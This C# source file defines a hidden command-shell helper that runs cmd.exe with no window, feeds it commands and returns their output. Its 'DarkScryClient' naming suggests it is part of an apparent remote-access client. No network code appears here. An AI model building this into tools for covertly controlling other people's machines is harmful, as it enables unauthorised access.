using System;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace DarkScryClient.Utils
{

	internal class CSShellServicecs : IDisposable
	{

		public static Process shellProcess;
		public static StreamReader shellOutput;
		public static StreamWriter shellInput;
		public static ProcessStartInfo procinfo;


		public CSShellServicecs()
		{
			string filename = "cmd.exe";
			procinfo = new ProcessStartInfo
			{
				FileName = filename,
				RedirectStandardOutput = true,
				RedirectStandardInput = true,
				UseShellExecute = false,
				CreateNoWindow = true
			};
			CreateInstance();
		}

		private void CreateInstance()
		{
			if (!Client.Info.IsMainShellRuning)
			{
				shellProcess = Process.Start(procinfo);
				shellOutput = shellProcess.StandardOutput;
				shellInput = shellProcess.StandardInput;
				Client.Info.IsMainShellRuning = true;
			}
		}

		public string RunCommand(string command)
		{
			if (!Client.Info.IsMainShellRuning)
			{
				CreateInstance();
			}
			if (command == "exit")
			{
				Dispose();
				return "";
			}
			string endOfCommandSignal = $"\"{Guid.NewGuid().ToString()}\"";
			shellInput.WriteLine(command + " 2>&1");
			shellInput.WriteLine(endOfCommandSignal);

			StringBuilder output = new StringBuilder();
			string line;
			bool isCommandEcho = true;
			while (!(line = shellOutput.ReadLine()).EndsWith(endOfCommandSignal))
			{
				if (!isCommandEcho)
				{
					if (line.EndsWith(" 2>&1"))
					{
						line = line.Substring(0, line.Length - 5);
					}
					output.AppendLine(line);
				}
				else if (line.EndsWith(" 2>&1") && line.Contains(command.Split('\n')[0]))
				{
					isCommandEcho = false;
				}
			}
			int lastIndex = output.ToString().LastIndexOf(Environment.NewLine);
			if (lastIndex > 0)
			{
				output.Remove(lastIndex, output.Length - lastIndex);
			}
			ClearShellOutput();
			return output.ToString();
		}



		private static void ClearShellOutput()
		{
			while (shellOutput.Peek() > -1)
			{
				shellOutput.ReadLine();
			}
		}

		public void Dispose()
		{
			if (Client.Info.IsMainShellRuning)
			{
				shellInput.Dispose();
				shellOutput.Dispose();
				shellProcess.Close();
				Client.Info.IsMainShellRuning = false;
			}
		}
	}
}
